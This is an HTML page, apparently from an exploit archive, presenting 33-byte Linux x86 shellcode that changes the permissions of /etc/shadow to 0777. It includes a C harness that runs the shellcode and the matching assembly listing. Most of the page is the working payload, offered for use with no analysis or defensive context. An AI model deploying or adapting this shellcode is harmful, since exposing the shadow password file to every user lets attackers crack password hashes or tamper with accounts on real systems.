<html><head><title>Linux/x86 - chmod(/etc/shadow, 0777) - 33 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# 5m0k3.digital.3scape@gmail.com
# http://plasticsouptaste.blogspot.com
# Name: 33 bytes chmod(&quot;/etc/shadow&quot;, 0777) shellcode
# Platform: Linux x86
 
#include &quot;stdio.h&quot;
 
int main(int argc, char *argv[])
{
 
char shellcode[]
=&quot;\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80&quot;;
 
printf(&quot;Length: %d\n&quot;,strlen(shellcode));
(*(void(*)()) shellcode)();
 
return 0;
}
 
/*
xor %eax,%eax
push %eax
mov $0xf,%al
push $0x776f6461
push $0x68732f63
push $0x74652f2f
mov %esp,%ebx
xor %ecx,%ecx
mov $0x1ff,%cx
int $0x80
inc %eax
int $0x80
 

-- 
Blog transitioéthanolique contemporain : http://plasticsouptaste.blogspot.com/!!
*/

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
